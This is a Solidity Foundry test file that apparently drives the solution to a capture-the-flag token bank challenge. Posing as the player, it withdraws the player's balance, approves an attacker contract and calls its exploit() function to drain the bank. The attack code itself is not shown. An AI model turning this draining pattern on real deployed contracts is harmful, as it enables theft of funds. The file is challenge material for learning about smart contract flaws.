// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    SimpleERC223Token public token;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
        token =  SimpleERC223Token(tokenBankChallenge.token());

        // Put your solution here
        vm.startPrank(player);
        // transfer and allowence
        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));
        token.approve(address(tokenBankAttacker), type(uint256).max);

        // attack
        tokenBankAttacker.exploit();
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
